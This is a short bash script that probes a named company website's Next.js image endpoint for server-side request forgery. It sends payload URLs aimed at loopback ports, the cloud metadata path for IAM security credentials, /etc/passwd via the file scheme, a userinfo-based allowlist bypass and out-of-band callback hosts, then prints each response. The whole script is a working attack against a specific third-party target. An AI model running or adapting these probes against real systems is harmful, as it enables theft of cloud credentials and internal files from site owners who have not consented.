#!/bin/bash
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
B="https://www.infinitycapital.bh/_next/image"
probe () {
  local label="$1"; local u="$2"
  printf "%-40s " "$label"
  curl -sk -A "$UA" -G --data-urlencode "url=$u" --data-urlencode "w=1080" "$B" -o /tmp/pp.bin -w "code=%{http_code} size=%{size_download} "
  head -c 90 /tmp/pp.bin | tr -d '\n'; echo
}
probe "control-ctfassets"   "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
probe "loopback-127"       "http://127.0.0.1:3000/"
probe "loopback-localhost" "http://localhost:3000/"
probe "metadata-linklocal" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
probe "userinfo-bypass"    "https://images.ctfassets.net@oob0574a7f353f1.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/ssrf"
probe "oob-plain"          "http://oob686b05fbfbf8.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/img"
probe "oob-ctf-subdomain"  "https://oob0574a7f353f1.ctfassets.net/x.png"
probe "file-scheme"        "file:///etc/passwd"
